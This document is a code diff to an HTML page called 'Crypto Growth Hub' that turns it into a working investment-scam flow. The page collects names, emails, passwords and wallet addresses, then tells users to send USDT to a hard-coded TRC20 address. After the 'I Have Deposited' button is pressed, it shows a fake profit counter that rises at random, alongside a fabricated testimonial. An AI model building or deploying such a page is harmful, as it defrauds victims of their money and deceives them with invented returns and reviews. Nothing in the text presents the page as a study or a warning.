@@ -37,7 +37,7 @@
       padding: 10px;
       border-left: 4px solid #00cc00;
     }
-    .cta {
+    .cta, .form-box button {
       background: #00cc00;
       color: white;
       padding: 12px 20px;
@@ -47,6 +47,8 @@
       margin: 20px auto;
       width: fit-content;
       border-radius: 5px;
+      cursor: pointer;
+      border: none;
     }
     .footer {
       margin-top: 40px;
@@ -73,75 +75,87 @@
       border-radius: 5px;
       border: 1px solid #ccc;
     }
-    .form-box button {
-      background: #008000;
-      color: white;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      width: 100%;
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Crypto Growth Hub</h1>
-    <p>Turn a small investment into massive returns. Withdraw profits fast. Trusted by over <strong>50,000 users worldwide!</strong></p>
+    <div id="main-content">
+      <div id="signup-box" class="form-box">
+        <h3>Sign Up</h3>
+        <input type="text" id="name" placeholder="Full Name">
+        <input type="email" id="email" placeholder="Email">
+        <input type="password" id="password" placeholder="Password">
+        <input type="text" id="wallet" placeholder="TRC20 Wallet Address">
+        <button onclick="signup()">Create Account</button>
+      </div>
 
-    <ul class="features">
-      <li><strong>Instant Profits:</strong> Your money grows in real time!</li>
-      <li><strong>AI-Powered Trades:</strong> No skills needed. Just invest and relax.</li>
-      <li><strong>Secure & Anonymous:</strong> Your privacy is our priority.</li>
-    </ul>
+      <div id="dashboard" class="hidden">
+        <h2>Welcome, <span id="username"></span></h2>
+        <p>Please deposit funds to activate your trading account:</p>
+        <div class="profit-box">
+          <p><strong>Send USDT (TRC20) to:</strong></p>
+          <p><strong style="font-size: 18px">TX48sDkMN32v91JkPE7zFxLw9e12q3B2L</strong></p>
+          <button onclick="confirmDeposit()">I Have Deposited</button>
+        </div>
+      </div>
 
-    <div class="profit-box">
-      <p><strong>Your Dashboard</strong></p>
-      <p>Invested: $100</p>
-      <p>Profit: <span id="profit">$900</span></p>
-      <p>Withdrawable: <span id="total">$1000</span></p>
+      <div id="profit-section" class="hidden">
+        <div class="profit-box">
+          <p><strong>Your Dashboard</strong></p>
+          <p>Invested: $100</p>
+          <p>Profit: <span id="profit">$900</span></p>
+          <p>Withdrawable: <span id="total">$1000</span></p>
+        </div>
+        <div class="testimonial">
+          “I was broke and unemployed. Now, I earn daily thanks to @CryptoMentor. I owe him everything!” – Happy Client
+        </div>
+      </div>
     </div>
-
-    <div class="testimonial">
-      “I was broke and unemployed. Now, I earn daily thanks to @CryptoMentor. I owe him everything!” – Happy Client
-    </div>
-
-    <a href="#signup" class="cta">Start Earning Now</a>
-
-    <div class="form-box" id="signup">
-      <h3>Sign Up</h3>
-      <input type="text" placeholder="Full Name">
-      <input type="email" placeholder="Email">
-      <input type="password" placeholder="Password">
-      <input type="text" placeholder="Binance ID / TRC20 Wallet Address">
-      <button onclick="alert('Signup successful! Dashboard loading...')">Create Account</button>
-    </div>
-
-    <div class="form-box">
-      <h3>Login</h3>
-      <input type="email" placeholder="Email">
-      <input type="password" placeholder="Password">
-      <button onclick="alert('Logged in! Redirecting to your dashboard...')">Login</button>
-    </div>
-
-    <div class="footer">
-      &copy; 2025 Crypto Growth Hub. All rights reserved.
-    </div>
+    <div class="footer">&copy; 2025 Crypto Growth Hub. All rights reserved.</div>
   </div>
 
   <script>
-    let profitEl = document.getElementById("profit");
-    let totalEl = document.getElementById("total");
-    let profit = 900;
-    let total = 1000;
-    setInterval(() => {
-      profit += Math.floor(Math.random() * 10);
-      total = 100 + profit;
-      profitEl.innerText = "$" + profit;
-      totalEl.innerText = "$" + total;
-    }, 2000);
+    function signup() {
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const wallet = document.getElementById("wallet").value;
+
+      if (name && email && password && wallet) {
+        localStorage.setItem("user", JSON.stringify({ name, email, wallet }));
+        document.getElementById("signup-box").classList.add("hidden");
+        document.getElementById("dashboard").classList.remove("hidden");
+        document.getElementById("username").innerText = name;
+      } else {
+        alert("Please fill in all fields.");
+      }
+    }
+
+    function confirmDeposit() {
+      document.getElementById("dashboard").classList.add("hidden");
+      document.getElementById("profit-section").classList.remove("hidden");
+      startProfits();
+    }
+
+    function startProfits() {
+      let profitEl = document.getElementById("profit");
+      let totalEl = document.getElementById("total");
+      let profit = 900;
+      let total = 1000;
+      setInterval(() => {
+        profit += Math.floor(Math.random() * 10);
+        total = 100 + profit;
+        profitEl.innerText = "$" + profit;
+        totalEl.innerText = "$" + total;
+      }, 2000);
+    }
   </script>
 </body>
 </html>
 
+      
   
